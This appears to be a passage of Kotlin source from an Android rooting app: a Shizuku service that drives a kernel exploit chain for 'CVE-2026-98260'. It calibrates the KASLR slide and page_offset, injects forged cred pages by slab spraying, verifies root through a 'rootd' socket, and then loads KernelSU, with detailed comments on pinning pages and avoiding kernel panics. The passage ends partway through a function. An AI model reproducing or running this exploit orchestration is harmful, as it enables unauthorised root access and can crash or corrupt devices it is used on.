package com.EternalTimes.GhostKey.shizuku

import android.content.Context
import android.os.Build
import android.os.Process
import android.util.Log
import com.EternalTimes.GhostKey.device.DeviceProfile
import com.EternalTimes.GhostKey.device.DeviceProfilePolicy
import com.EternalTimes.GhostKey.device.PrivilegeGate
import com.EternalTimes.GhostKey.ksu.KsudStage
import com.EternalTimes.GhostKey.native.NativeContract
import com.EternalTimes.GhostKey.native.NativeContract.Stage
import com.EternalTimes.GhostKey.tryQuietly
import java.io.ByteArrayOutputStream
import java.io.File
import java.io.RandomAccessFile
import java.lang.Process as JavaProcess
import java.util.concurrent.Executors
import java.util.concurrent.TimeUnit
import java.util.concurrent.atomic.AtomicBoolean

/**
 * Shizuku 用户服务：承载完整的 CVE-2026-98260 利用链路。
 *
 * 链路严格对齐 PC 参考实现 run.py：
 *   [1/9] 检测设备（宿主 ExploitEngine 已做）
 *   [2/9] 匹配内核条目（宿主已做，blob 经 AIDL 传入）
 *   [3/9] 编译（APK 预编译）
 *   [4/9] 推送（原生体已在 APK 内，ksud 从 assets 解压）
 *   [5/9] 校准：calibrate-a(slide) -> calibrate-b(page_offset)
 *   [6/9] 等待负载降低
 *   [7/9] 注入：exploit --slide .. --page-offset ..
 *   [8/9] 验证：su -c id => uid=0(root)
 *   [9/9] KSU 接管：经 rootd(uid=0) 执行 late-load
 */
class Cve98260UserService(private val context: Context) : ICve98260UserService.Stub() {

    private val running = AtomicBoolean(false)

    @Volatile private var exploitProcess: JavaProcess? = null

    /** 本轮 rootd 的 socket 路径（每轮唯一，经 PC98260_SOCK 传给原生体） */
    @Volatile private var socketPath: String = ROOT_SOCK

    /** 本轮 rootd 的 stop 文件路径（每轮唯一，经 PC98260_STOP_FILE 传给原生体） */
    @Volatile private var stopFilePath: String = File(WORK_DIR, "rootd.stop").absolutePath

    /** 用户选定的 Root 管理器包名（多管理器场景，经 [setManagerPackage] 传入；null=自动）。 */
    @Volatile private var selectedManager: String? = null

    companion object {
        private const val TAG = "Cve98260UserService"
        private const val STATUS_MARKER = NativeContract.STATUS_MARKER
        private const val WORK_DIR = "/data/local/tmp/cve98260-app"

        /** 与 pc98260_rootd.c 的 ROOT_SOCK 默认值一致（仅作回退/清理旧文件用） */
        private const val ROOT_SOCK = "/data/local/tmp/pc98260-root.sock"
        private const val ROOTD_MARKER = "C98260_ROOTD_READY=1"

        /**
         * 原生体的「我已经放弃」标记（uaf_plant.c 的 EXPLOIT_FAILED_MARKER）。
         *
         * 原生体打不出 rootd 标记时，宿主原来只能死等满 300 s 才报超时
         * （真机实测白等 134 s）。看到这个标记就立刻收场。
         */
        private const val FAILED_MARKER = "C98260_EXPLOIT_FAILED=1"

        /**
         * 原生体进程退出后的宽限期（毫秒）。
         *
         * 宿主用 --daemon-exit 启动原生体：**成功路径里主进程本来就会正常退出**
         * （rootd 是 cred child 的孙进程，还在跑），而 rootd 写就绪标记与主
         * 进程退出是并行的两条线，中间有几十毫秒的窗口。所以进程退出后还要
         * 再等这么久看标记有没有到，避免把「已提权成功」误报成失败。
         */
        private const val EXIT_GRACE_MS = 5_000L

        /**
         * E4：日志尾扫上限。旧实现只扫末 32KB，若就绪/失败标记写入较早、其后日志
         * 超过 32KB 就会漏判。日志文件每轮开始时被截断（见 runChain 的 writeText("")），
         * 因此从头扫描不会命中上一轮残留；上限仅用于兜住异常超大日志。
         */
        private const val TAIL_SCAN_MAX = 4 * 1024 * 1024

        private const val CALIB_A_TIMEOUT_SEC = 180L
        private const val CALIB_B_TIMEOUT_SEC = 240L
        private const val INJECT_TIMEOUT_SEC = 300L
        private const val VERIFY_TIMEOUT_SEC = 30L
        private const val KSU_TIMEOUT_SEC = 180L

        /**
         * App 通道 su 探测的等待上限（毫秒）。
         *
         * App 侧每个候选自己也有 4s 上限、5 个候选最坏 ~20s，所以这里留 25s；
         * 超时按「探测失败」处理，不能把 KSU 阶段挂死。
         */
        private const val SU_APP_PROBE_TIMEOUT_MS = 25_000L

        /**
         * 一个子步骤超时的返回码（区别于正常的非 0 退出码）。
         *
         * 超时时**不杀进程**，只返回这个值：该类进程可能已经 fork 出钉住受害页的
         * AIO holder 子进程，SIGKILL 会让 pin 塌陷并 panic（见 [4] 段注释）。
         */
        private const val RC_STEP_TIMEOUT = -9

        /** 安全退场：等待 rootd 优雅退出的超时 */
        private const val ROOTD_STOP_TIMEOUT_SEC = 30L

        /** 安全退场：等待 exploit 父进程退出的超时 */
        private const val EXPLOIT_EXIT_TIMEOUT_SEC = 20L

        /**
         * 上一次真正开始喷洒（INJECT 阶段）时的 boot_id。
         *
         * 一次成功的利用会把带内核指针的整页喷进内核 slab；那一页若被 cred slab
         * 领走，某个 task 的 uid 就变成内核地址的低 32 位（负 userId），
         * AMS 一扫描就抛 IllegalArgumentException -> system_server 崩溃 ->
         * framework 重启循环。**脏 cred 在内核 slab 里，只有内核重启能清**，
         * framework 重启清不掉。
         *
         * 所以「上次跑完没完整重启就再跑」= 直接踩进那个崩溃循环。
         * 用 boot_id 把这条纪律自动化：boot_id 没变 == 没完整重启过。
         */
        private const val LAST_INJECT_BOOT_ID = "last_inject_boot_id.txt"

        /** 返回码：上一次喷洒后设备没有完整重启过，本轮被拦下。 */
        private const val RC_BOOT_ID_UNCHANGED = 6

        private const val RESULT_SLIDE = "slide.txt"
        private const val RESULT_PAGE_OFFSET = "page_offset.txt"
        private const val RESULT_PAGE_OFFSET_SCORE = "page_offset.score"

        private val HEX_RE = Regex("^0x[0-9a-fA-F]+$")

        private fun stageIndex(stage: String): Int = NativeContract.Stage.indexOf(stage)
    }

    override fun executeExploit(profileBlob: ByteArray?, callback: ICve98260Callback?) {
        if (!running.compareAndSet(false, true)) {
            callback?.onLog("<s> error: another exploit process is already running")
            callback?.onComplete(1)
            return
        }

        Thread({
            val code = try {
                runChain(profileBlob, callback)
            } catch (e: Exception) {
                Log.e(TAG, "execution failed", e)
                tryQuietly { callback?.onLog("<s> error: ${e.message}") }
                1
            }
            tryQuietly { callback?.onComplete(code) }
            running.set(false)
        }, "c98260-runner").start()
    }


    private fun runChain(profileBlob: ByteArray?, callback: ICve98260Callback?): Int {
        val gate = PrivilegeGate.checkService()
        require(gate.ok) { "not shell/root uid (${gate.uid})" }
        val self = File("/proc/self/status").readText()
        require(Regex("(?m)^Seccomp:\\s*0$").containsMatchIn(self)) {
            "seccomp not disabled (Shizuku UserService filtered)"
        }
        callback?.onLog("<s> Shizuku ready: uid=${gate.uid} seccomp=0")

        val nativeLib = File(context.applicationInfo.nativeLibraryDir, "libcve98260.so")
        require(nativeLib.isFile) { "native binary missing: ${nativeLib.absolutePath}" }

        val workDir = File(WORK_DIR).apply {
            require(isDirectory || mkdirs()) { "failed to create work dir: $absolutePath" }
        }
        val logFile = File(workDir, ".cve98260_native.log").apply { writeText("") }
        val roundId = System.currentTimeMillis()
        socketPath = File(workDir, "root-$roundId.sock").absolutePath
        stopFilePath = File(workDir, "root-$roundId.stop").absolutePath
        File(workDir, RESULT_SLIDE).delete()
        File(workDir, RESULT_PAGE_OFFSET).delete()
        File(workDir, RESULT_PAGE_OFFSET_SCORE).delete()

        val ksud = resolveKsud(workDir, callback)
        if (ksud != null) callback?.onLog("<s> ksud: ${ksud.absolutePath}")
        else callback?.onLog("<s> warn: ksud not available, KSU takeover will be skipped")

        val env = baseEnv(workDir, ksud)

        val tailer = Thread({ relayLog(logFile, callback) }, "c98260-tailer").apply {
            isDaemon = true
            start()
        }

        try {
            //
            //
            //
            //
            val stale = residualNativePids()
            if (stale.isNotEmpty()) return resolveResidual(stale, workDir, env, callback)
            if (!bootIdGuard(workDir, callback)) return RC_BOOT_ID_UNCHANGED
            callback?.onLog("<b> cleaning up stale sockets and stop files")
            val staleFailed = cleanupStale(workDir)
            if (staleFailed > 0) {
                callback?.onLog(
                    "<s> stale cleanup: $staleFailed node(s) still present " +
                        "(unlink denied while SELinux is Enforcing)",
                )
            }

            callback?.onProgress(stageIndex(Stage.CALIB_A), "running")
            val rcA = runStep(
                listOf(nativeLib.absolutePath, "calibrate-a"),
                workDir, env, logFile, profileBlob, CALIB_A_TIMEOUT_SEC,
            )
            val slide = readResult(workDir, RESULT_SLIDE)
            if (slide == null) {
                callback?.onLog("<s> error: calib_a failed to solve KASLR slide (rc=$rcA), abort")
                callback?.onProgress(stageIndex(Stage.CALIB_A), "failed")
                return 2
            }
            callback?.onLog("<b> KASLR slide = $slide")
            callback?.onProgress(stageIndex(Stage.CALIB_A), "ok")

            callback?.onProgress(stageIndex(Stage.CALIB_B), "running")
            //
            // 机型配置（加速层）：page_offset 是**编译期常量** —— 线性映射基址由
            // VA bits 与页大小决定，不随 KASLR 变。命中可信值时直接用，跳过
            // calibrate-b 的全量扫描（真机实测省 ~9 秒，全程 39 秒）。
            // 命中条件见 DeviceProfilePolicy.planPageOffset()（含页大小校验）。
            val deviceProfile = loadDeviceProfile()
            val pageOffsetPlan = DeviceProfilePolicy.planPageOffset(deviceProfile, runtimePageSize())
            callback?.onLog(
                if (deviceProfile != null) {
                    "<s> device profile ${deviceProfile.id}: ${pageOffsetPlan.reason}"
                } else {
                    "<s> no device profile for ${Build.PRODUCT}/${Build.DEVICE}: running calibrate-b"
                },
            )
            val pageOffset: String
            val score: String
            if (pageOffsetPlan.trusted && pageOffsetPlan.value != null) {
                pageOffset = DeviceProfilePolicy.formatHexU(pageOffsetPlan.value)
                score = "device-profile"
                tryQuietly {
                    File(workDir, RESULT_PAGE_OFFSET).writeText(pageOffset)
                    File(workDir, RESULT_PAGE_OFFSET_SCORE).writeText(score)
                }
                callback?.onLog(
                    "<b> linear map base = $pageOffset (${pageOffsetPlan.reason}; skipping calibrate-b)",
                )
                callback?.onProgress(stageIndex(Stage.CALIB_B), "skipped")
            } else {
                val rcB = runStep(
                    listOf(nativeLib.absolutePath, "calibrate-b", "--slide", slide),
                    workDir, env, logFile, profileBlob, CALIB_B_TIMEOUT_SEC,
                )
                pageOffset = readResult(workDir, RESULT_PAGE_OFFSET) ?: run {
                    callback?.onLog("<s> error: calib_b failed to solve page_offset (rc=$rcB), abort")
                    callback?.onProgress(stageIndex(Stage.CALIB_B), "failed")
                    return 3
                }
                score = runCatching {
                    File(workDir, RESULT_PAGE_OFFSET_SCORE).readText().trim()
                }.getOrDefault("?")
                callback?.onLog("<b> linear map base = $pageOffset (confidence $score)")
                if (score == "fallback") {
                    callback?.onLog("<s> warn: page_offset not verified, fell back to profile default")
                }
                callback?.onProgress(
                    stageIndex(Stage.CALIB_B),
                    if (score == "fallback") "degraded" else "ok",
                )
            }

            waitIdle()

            callback?.onProgress(stageIndex(Stage.INJECT), "running")
            /*
             * 从这一刻起内核 slab 可能已经被喷洒过 -> 记下当前 boot_id。
             * 下一轮若 boot_id 没变，就说明设备没完整重启过，直接拦下。
             */
            markInjectBootId(workDir)
            val proc = startProcess(
                listOf(
                    nativeLib.absolutePath, "exploit",
                    "--slide", slide,
                    "--page-offset", pageOffset,
                    "--daemon-exit",
                ),
                workDir, env, logFile, profileBlob,
            )
            exploitProcess = proc
            recordOomScoreAdj(processPid(proc), callback)
            callback?.onLog("<b> injection started (pid held by native), waiting for rootd...")

            if (!waitForRootd(logFile, INJECT_TIMEOUT_SEC * 1000)) {
                val gaveUp = tailContains(logFile, FAILED_MARKER)
                val proc = exploitProcess
                val died = proc != null && !proc.isAlive
                callback?.onLog(
                    when {
                        gaveUp ->
                            "<s> error: exploit gave up before rootd was ready (native abort marker)"
                        died ->
                            "<s> error: exploit process exited unexpectedly, injection failed"
                        else ->
                            "<s> error: rootd not ready in time, injection failed"
                    }
                )
                callback?.onProgress(stageIndex(Stage.INJECT), "failed")
                return 4
            }
            callback?.onProgress(stageIndex(Stage.INJECT), "ok")
            callback?.onLog("<s> rootd ready, temporary root channel established")

            if (!verifyTemporaryRoot(nativeLib, workDir, env, callback)) {
                callback?.onProgress(stageIndex(Stage.VERIFY), "failed")
                return 5
            }

            val ksuLive = if (ksud == null) {
                callback?.onProgress(stageIndex(Stage.KSU), "skipped")
                callback?.onLog("<s> skip KSU takeover (no ksud)")
                false
            } else {
                ksuTakeover(nativeLib, workDir, env, logFile, profileBlob, callback)
            }

            //
            //
            if (ksuLive) {
                callback?.onLog("<b> KernelSU provides the real root channel")
                callback?.onLog(
                    "<s> native daemon (page holder + rootd) stays resident by design, " +
                        "same as the PC reference implementation",
                )
                /*
                 * KSU 接管用的是**运行时加载**（late-load）的内核模块，这个模块会一直
                 * 留在内核里，直到**完整重启**（kernel reboot）才被卸载。
                 *
                 * 而「软重启」（userspace reboot / svc power reboot）只重启用户态：
                 * 内核不动 → 模块留下，但它的用户态配套（ksud、init 时序）全没了。
                 * 这个组合最容易在下次启动时出问题：boot 阶段的 init 碰到一个
                 * 「状态残缺的旧模块」，可能连着崩几轮 system_server，
                 * 表现就是「软重启成功几秒后又自动软重启」，甚至变成普通重启。
                 *
                 * → 明确告诉用户：接管之后要**完整重启**（adb reboot / 长按电源），
                 *   不要用软重启收场。
                 */
                callback?.onLog(
                    "<b> 提示：KSU 模块是运行时加载的，会一直留在内核里。" +
                        "收场请用**完整重启**（adb reboot 或长按电源），" +
                        "不要用软重启 —— 软重启会留下状态残缺的模块，" +
                        "下次开机可能反复自动重启。",
                )
            } else {
                callback?.onLog(
                    "<s> warn: KSU takeover not confirmed, " +
                        "keeping temporary root channel (exploit process stays alive)",
                )
            }
            return 0
        } finally {
            tailer.interrupt()
            tryQuietly { tailer.join(800) }
        }
    }

    /**
     * 当前内核启动标识。/proc/sys/kernel/random/boot_id 是 0444，shell 也能读。
     * 读不到就返回 null —— 此时不做任何拦截：宁可放行，也不能因为读不到就误伤。
     */
    private fun currentBootId(): String? = runCatching {
        File("/proc/sys/kernel/random/boot_id").readText().trim()
    }.getOrNull()?.takeIf { it.isNotEmpty() }

    /**
     * boot_id 守卫：上一次喷洒之后设备没有完整重启过，就拦下本轮。
     *
     * 拦它的理由不是「保守」，而是确定性的：一次成功的利用必然在内核 slab 里
     * 留下一页带内核指针的内存，那一页一旦被 cred slab 领走，就有一个 task 的
     * uid 变成负数（Invalid userId）-> system_server 崩溃循环；而脏 cred 只有
     * 内核重启能清，软重启和 framework 重启都清不掉。
     */
    private fun bootIdGuard(workDir: File, callback: ICve98260Callback?): Boolean {
        val cur = currentBootId() ?: return true
        val prev = runCatching {
            File(workDir, LAST_INJECT_BOOT_ID).readText().trim()
        }.getOrNull()
        if (prev.isNullOrEmpty() || prev != cur) return true
        callback?.onLog("<s> error: 上一次提权之后设备没有完整重启过（boot_id 未变）")
        callback?.onLog(
            "<s> 内核 slab 里可能还留着上次喷洒的脏 cred：某个 task 的 uid 变成内核" +
                "地址的低 32 位（负 userId），AMS 一扫描就抛 IllegalArgumentException，" +
                "system_server 会进入崩溃循环。",
        )
        callback?.onLog(
            "<b> 请先**完整重启**（adb reboot / 长按电源）再跑一次。" +
                "软重启清不掉内核 slab。",
        )
        return false
    }

    /** 记录「本轮已经开始喷洒」的时刻对应的 boot_id。 */
    private fun markInjectBootId(workDir: File) {
        val cur = currentBootId() ?: return
        tryQuietly { File(workDir, LAST_INJECT_BOOT_ID).writeText(cur) }
    }

    /**
     * R1：[4] 段的残留进程处置决策（从 [runChain] 抽出，仅搬家不改行为）。
     *
     * 返回本轮应直接结束的退出码：
     *   0 = 残留存在但 KernelSU 已是活跃 root 提供方 → 复用现有 root，跳过重新注入；
     *   8 = 残留存在且没有任何可用 root → 中止本轮，要求重启后再跑。
     * 调用点仅在 stale 非空时进入，因此必然终结本轮。
     */
    private fun resolveResidual(
        stale: List<Int>,
        workDir: File,
        env: Map<String, String>,
        callback: ICve98260Callback?,
    ): Int {
        if (ksuRootLive(workDir, env, callback)) {
            callback?.onLog(
                "<s> detected residual native process(es) " +
                    "[${stale.joinToString(",")}] but KernelSU already provides root",
            )
            callback?.onLog("<b> reusing existing KernelSU root; skipping re-exploitation")
            return 0
        }
        callback?.onLog(
            "<s> error: previous round left native process(es) [${stale.joinToString(",")}]",
        )
        callback?.onLog(
            "<s> error: they still pin the pages holding the injected cred " +
                "(the set includes the AIO holder children from hold_aio_children)",
        )
        callback?.onLog(
            "<s> error: killing them would drop that pin and panic the kernel, " +
                "so this round is aborted instead of cleared",
        )
        callback?.onLog("<s> reboot the device, then run the pipeline again")
        return 8
    }

    /**
     * R1：[8] 段 root 验证（从 [runChain] 抽出，仅搬家不改行为）。
     *
     * rootd 虽已打印就绪，但 accept 队列/凭据落位仍可能有毫秒级延迟，单次失败
     * 就判死会把「差 200ms」误报成「提权失败」，故重试若干次。
     */
    private fun verifyTemporaryRoot(
        nativeLib: File,
        workDir: File,
        env: Map<String, String>,
        callback: ICve98260Callback?,
    ): Boolean {
        callback?.onProgress(stageIndex(Stage.VERIFY), "running")
        var idOut = ""
        for (attempt in 1..8) {
            idOut = runCapture(
                listOf(nativeLib.absolutePath, "su", "-c", "id"),
                workDir, env, VERIFY_TIMEOUT_SEC,
            ).trim()
            if (idOut.contains("uid=0(root)")) break
            if (attempt == 1) {
                callback?.onLog("<s> first verify failed: ${idOut.ifEmpty { "<empty>" }}, retrying")
            }
            Thread.sleep(1500)
        }
        callback?.onLog("<b> su -c id => ${idOut.ifEmpty { "<empty>" }}")
        if (!idOut.contains("uid=0(root)")) {
            callback?.onLog("<s> error: temporary root verify failed (socket=$socketPath)")
            return false
        }
        callback?.onProgress(stageIndex(Stage.VERIFY), "ok")
        callback?.onLog("<s> temporary root verified")
        return true
    }

    /**
     * R1：[9] 段 KernelSU 接管（从 [runChain] 抽出，仅搬家不改行为）。
     * 返回 KSU 是否已经成为可用的正规 root 通道。
     */
    private fun ksuTakeover(
        nativeLib: File,
        workDir: File,
        env: Map<String, String>,
        logFile: File,
        profileBlob: ByteArray?,
        callback: ICve98260Callback?,
    ): Boolean {
        callback?.onProgress(stageIndex(Stage.KSU), "running")
        val rcK = runStep(
            listOf(nativeLib.absolutePath, "ksu-takeover"),
            workDir, env, logFile, profileBlob, KSU_TIMEOUT_SEC,
        )
        val moduleLive = modulesHasKernelsu()
        if (ksuAllowShellRequested(workDir)) {
            callback?.onLog(
                "<s> ksu allow_shell=1 (module-load param; only effective when the module is " +
                    "RE-loaded — one already in /proc/modules keeps its old params)",
            )
        }
        //
        // su 探测走**两条通道**（见 suProbe / suProbeAppUid）：
        //   · shell 通道 —— 本 UserService 的 uid 2000，需要 allow_shell=1；
        //   · App 通道   —— App 自己的 uid，用户在 KSU 管理器里授权的就是它。
        // 2026-10-31 真机：只探 shell 通道，KSU 明明在工作也报「没有 su」。
        //
        val probeShell = suProbe(workDir, env)
        val probeApp = suProbeAppUid(callback)
        val independentSu = suWorks(probeShell) || suWorks(probeApp)
        callback?.onLog("<s> independent su (shell uid) => ${probeShell.ifEmpty { "<empty>" }}")
        callback?.onLog(
            "<s> independent su (app uid ${appUid()}) => ${probeApp.ifEmpty { "<empty>" }}",
        )
        if (independentSu) {
            val via = if (suWorks(probeApp)) "app uid ${appUid()}" else "shell uid"
            callback?.onLog("<b> KernelSU su available via $via")
        } else {
            callback?.onLog(
                "<s> hint: KernelSU 的 superuser 授权按 uid 管理 —— 请在 KernelSU 管理器" +
                    " →「超级用户」中授权 ${context.packageName}，" +
                    " 或用 allow_shell=1 重新加载模块以放行 shell(uid 2000)",
            )
        }
        // 接管脚本里 late-load 装出来的 userspace 组件 —— 内核替换 su 用的就是它
        reportKsudInstall(workDir, callback)
        val ksuLive = moduleLive || independentSu
        callback?.onProgress(stageIndex(Stage.KSU), if (ksuLive) "ok" else "failed")
        callback?.onLog(
            if (ksuLive) {
                "<s> KernelSU ready (module=$moduleLive, independent su=$independentSu)"
            } else {
                "<s> warn: KernelSU not loaded (rc=$rcK, see ${workDir}/ksu_takeover.log)"
            },
        )
        return ksuLive
    }


    private fun baseEnv(workDir: File, ksud: File?): Map<String, String> =
        buildMap {
            put("CVE98260_HOME", workDir.absolutePath)
            put("TMPDIR", workDir.absolutePath)
            put("HOME", workDir.absolutePath)
            put("PATH", "/system/bin:/vendor/bin:/data/local/tmp")
            put("PLANT_FAST", "1")
            put("PC98260_SOCK", socketPath)
            put("PC98260_STOP_FILE", stopFilePath)
            ksud?.let { put("CVE98260_KSUD", it.absolutePath) }
            put("CVE98260_KSU_LOG", File(workDir, "ksu_takeover.log").absolutePath)
            // allow_shell 开关：默认关，需要时由设备侧的小文件打开（见 ksuAllowShellRequested）
            put("CVE98260_KSU_ALLOW_SHELL", if (ksuAllowShellRequested(workDir)) "1" else "0")
        }

    /**
     * `allow_shell` 开关（**默认关**）。
     *
     * `allow_shell=1` 是上游 late-load 的**模块加载参数**，含义「Always allow shell
     * to get root permission」—— 放行 shell(uid 2000)，也就是本 UserService 的身份。
     * **只在模块首次加载时生效**：上游 `late_load::run` 开头就检查 `has_kernelsu()`，
     * 已加载则跳过 `load_module`，参数无处可施。所以即便打开，也必须**重新加载
     * 模块**才见效。
     *
     * 为什么放在设备侧文件而不是 App 的 SharedPreferences：本 UserService 跑在
     * **Shizuku 进程空间（uid 2000）**，读不到 App 私有目录里的文件；而
     * `/data/local/tmp/cve98260-app` 是双方都能读写的既有工作目录。
     *
     * 打开方式：
     * ```
     * adb shell 'echo 1 > /data/local/tmp/cve98260-app/allow_shell'
     * ```
     * 关闭：删掉该文件（或写入 0）。
     */
    private fun ksuAllowShellRequested(workDir: File): Boolean =
        runCatching { File(workDir, "allow_shell").readText().trim() == "1" }
            .getOrDefault(false)

    private fun applyEnv(pb: ProcessBuilder, env: Map<String, String>) {
        pb.environment().putAll(env)
    }

    private fun writeBlob(stream: java.io.OutputStream, blob: ByteArray?) {
        if (blob == null || blob.isEmpty()) return
        val len = blob.size
        stream.write(
            byteArrayOf(
                (len ushr 24).toByte(),
                (len ushr 16).toByte(),
                (len ushr 8).toByte(),
                len.toByte(),
            ),
        )
        stream.write(blob)
        stream.flush()
    }

    /** 跑完一个子命令（输出追加到统一日志，由 tailer 转发）。 */
    private fun runStep(
        cmd: List<String>,
        workDir: File,
        env: Map<String, String>,
        logFile: File,
        blob: ByteArray?,
        timeoutSec: Long,
    ): Int {
        val pb = ProcessBuilder(cmd)
            .directory(workDir)
            .redirectErrorStream(true)
            .redirectOutput(ProcessBuilder.Redirect.appendTo(logFile))
        applyEnv(pb, env)
        val p = pb.start()
        tryQuietly { writeBlob(p.outputStream, blob) }
        return if (p.waitFor(timeoutSec, TimeUnit.SECONDS)) p.exitValue() else {
            val label = cmd.firstOrNull() ?: "step"
            Log.w(TAG, "step timed out after ${timeoutSec}s, left alive: $cmd")
            tryQuietly {
                logFile.appendText(
                    "<s> warn: $label still running after ${timeoutSec}s; " +
                        "left it alive on purpose (killing native processes can drop the pin " +
                        "on the cred pages and panic the kernel)\n",
                )
            }
            RC_STEP_TIMEOUT
        }
    }

    /** 启动长驻子进程（exploit），不等待。 */
    private fun startProcess(
        cmd: List<String>,
        workDir: File,
        env: Map<String, String>,
        logFile: File,
        blob: ByteArray?,
    ): JavaProcess {
        val pb = ProcessBuilder(cmd)
            .directory(workDir)
            .redirectErrorStream(true)
            .redirectOutput(ProcessBuilder.Redirect.appendTo(logFile))
        applyEnv(pb, env)
        val p = pb.start()
        tryQuietly { writeBlob(p.outputStream, blob) }
        return p
    }

    /** 跑一个子命令并取回它的输出（用于 su -c id 验证）。 */
    private fun runCapture(
        cmd: List<String>,
        workDir: File,
        env: Map<String, String>,
        timeoutSec: Long,
    ): String {
        val out = File(workDir, "verify.out").apply { delete() }
        val pb = ProcessBuilder(cmd)
            .directory(workDir)
            .redirectErrorStream(true)
            .redirectOutput(out)
        applyEnv(pb, env)
        val p = pb.start()
        tryQuietly { p.outputStream.close() }
        if (!p.waitFor(timeoutSec, TimeUnit.SECONDS))
            Log.w(TAG, "capture timed out after ${timeoutSec}s, left alive: $cmd")
        return runCatching { out.readText() }.getOrDefault("")
    }


    /**
     * KSU 接管成功后的安全退场（safe release）。
     *
     * 背景：KSU 接管成功后，root 能力已由 KernelSU 提供，exploit 原生进程
     * （它持有被占住的页面，并 fork 出了 rootd）就没有继续驻留的必要。
     * 原生侧新增了 "rootd-stop" 子命令：它让 rootd 优雅退出并删除 socket 文件，
     * cred 子进程与 exploit 父进程随后会自行退出。
     *
     * 本函数整体是非致命的：任何异常都不能让已经成功的 KSU 接管变成整轮失败，
     * 因此全部包在 runCatching 里，失败只记日志。
     */
    private fun safeRelease(
        nativeLib: File,
        workDir: File,
        env: Map<String, String>,
        logFile: File,
        profileBlob: ByteArray?,
        ksud: File?,
        callback: ICve98260Callback?,
    ) {
        runCatching {
            val independentRoot = probeIndependentRoot(workDir, env, callback)

            val rc = runStep(
                listOf(nativeLib.absolutePath, "rootd-stop"),
                workDir, env, logFile, profileBlob, ROOTD_STOP_TIMEOUT_SEC,
            )
            if (rc == 0) {
                callback?.onLog("<b> rootd stop confirmed (rc=0)")
            } else {
                callback?.onLog("<s> warn: rootd stop not confirmed rc=$rc")
            }

            //
            //
            //
            //
            //
            val stillBorrowing = scanBorrowedCredHolders(workDir, env, independentRoot, ksud, callback)

            //
            val exited = if (rc == 0 && independentRoot && !stillBorrowing) {
                exploitProcess?.waitFor(EXPLOIT_EXIT_TIMEOUT_SEC, TimeUnit.SECONDS) == true
            } else {
                false
            }
            if (exited) {
                callback?.onLog("<b> exploit process exited, no residual libcve98260.so")
            } else {
                val why = when {
                    rc != 0 -> "rootd stop not confirmed"
                    !independentRoot -> "no independent root channel"
                    stillBorrowing -> "procs still on the borrowed cred"
                    else -> "exploit process still alive after ${EXPLOIT_EXIT_TIMEOUT_SEC}s"
                }
                callback?.onLog(
                    "<s> warn: native process stays resident ($why); " +
                        "leaving it alive is safer than freeing the borrowed cred",
                )
            }

            val residual = residualNativePids()
            callback?.onLog(
                "<s> residual check: ${residual.size} process(es) [${residual.joinToString(",")}]"
            )
            if (residual.isEmpty()) {
                callback?.onLog("<b> no residual libcve98260.so process, native retired")
            } else {
                callback?.onLog(
                    "<s> warn: native residue remains; borrowed cred page kept alive " +
                        "(safer than freeing it)"
                )
            }
        }.onFailure {
            Log.w(TAG, "safe release failed", it)
            tryQuietly { callback?.onLog("<s> warn: safe release failed: ${it.message}") }
        }
    }

    /**
     * R1：safeRelease (1) 段——探测「独立 root 通道」（从 [safeRelease] 抽出，仅搬家）。
     *
     * 判据：KSU 的 su 必须落在正规 KSU 域（u:r:ksu:s0）并拿到 uid=0，说明 root
     * 能力已由内核模块正规提供，不再依赖我们的临时通道。rootd 通道给出的 context
     * 是 u:object_r:unlabeled:s0（注入伪造 cred 的产物），据此可区分两条路径。
     */
    private fun probeIndependentRoot(
        workDir: File,
        env: Map<String, String>,
        callback: ICve98260Callback?,
    ): Boolean {
        val suOut = runCatching {
            runCapture(
                listOf("/system/bin/sh", "-c", "su -c id"),
                workDir, env, VERIFY_TIMEOUT_SEC,
            ).trim()
        }.getOrDefault("")
        callback?.onLog("<s> evidence: independent su => ${suOut.ifEmpty { "<empty>" }}")
        val independentRoot = suOut.contains("uid=0(root)") &&
            suOut.contains("context=u:r:ksu:s0")
        if (independentRoot) {
            callback?.onLog("<b> independent root channel available (u:r:ksu:s0)")
        } else {
            callback?.onLog(
                "<s> warn: no independent root channel in a regular KSU domain; " +
                    "keeping native process resident",
            )
        }
        return independentRoot
    }

    /**
     * R1：safeRelease (3) 段——扫「仍持有伪造 cred」的进程（从 [safeRelease] 抽出）。
     *
     * 优先用 KSU 的 su 以 root 权限扫：shell 域读不到 uid 0 进程的
     * /proc/<pid>/attr/current 时会静默漏报，而漏报会导致错误放行退场。
     * 返回 true 表示仍有进程持有那份伪造 cred（此时绝不能释放页面）。
     */
    private fun scanBorrowedCredHolders(
        workDir: File,
        env: Map<String, String>,
        independentRoot: Boolean,
        ksud: File?,
        callback: ICve98260Callback?,
    ): Boolean {
        Thread.sleep(600)
        val borrowedHolders = if (independentRoot) {
            unlabeledDomainPidsViaRoot(workDir, env)
        } else {
            null
        }
        val holders = borrowedHolders ?: unlabeledDomainPidsDirect()
        if (borrowedHolders == null) {
            callback?.onLog(
                "<s> warn: unlabeled-domain scan ran without root; " +
                    "results may under-report (treated conservatively)",
            )
        }
        val allDaemons = ksud?.let { ksudDaemonPids(it) }.orEmpty()
        callback?.onLog(
            "<s> evidence: ksud daemons => ${allDaemons.joinToString(",").ifEmpty { "<none>" }} " +
                "; procs on borrowed cred => " +
                holders.joinToString(",").ifEmpty { "none" } +
                if (borrowedHolders != null) " (scanned as root)" else " (shell scan)",
        )
        val stillBorrowing = holders.isNotEmpty()
        if (stillBorrowing) {
            callback?.onLog(
                "<s> warn: ${holders.joinToString(",")} still holds the " +
                    "borrowed cred; not releasing the page (would panic the kernel). " +
                    "Native process stays resident.",
            )
        }
        return stillBorrowing
    }

    /** 扫 /proc 下所有数字目录的 cmdline，统计仍含 "libcve98260.so" 的进程（跳过自己）。 */
    private fun residualNativePids(): List<Int> {
        val self = Process.myPid()
        return runCatching {
            File("/proc").listFiles()
                ?.mapNotNull { it.name.toIntOrNull() }
                .orEmpty()
                .filter { it != self }
                .filter { pid ->
                    val cmdline = runCatching {
                        File("/proc/$pid/cmdline").readBytes().toString(Charsets.UTF_8)
                    }.getOrNull()
                    cmdline != null && cmdline.contains("libcve98260.so")
                }
        }.getOrDefault(emptyList())
    }

    /** 扫 /proc 找仍在运行的 ksud 守护进程。
     *
     *  只按 `ksud` 这个名字匹配，不绑死绝对路径：ksud 启动后可能 re-exec 到
     *  `/data/adb/ksud`（设备版），用 `/data/local/tmp/cve98260-app/ksud` 去精确
     *  匹配会漏检——真机 22:27 那轮就出现过「shell 起得来但 /proc 里找不到」，
     *  到底是没起来还是没认出来，旧实现无法区分。 */
    private fun ksudDaemonPids(ksud: File): List<Int> {
        val self = Process.myPid()
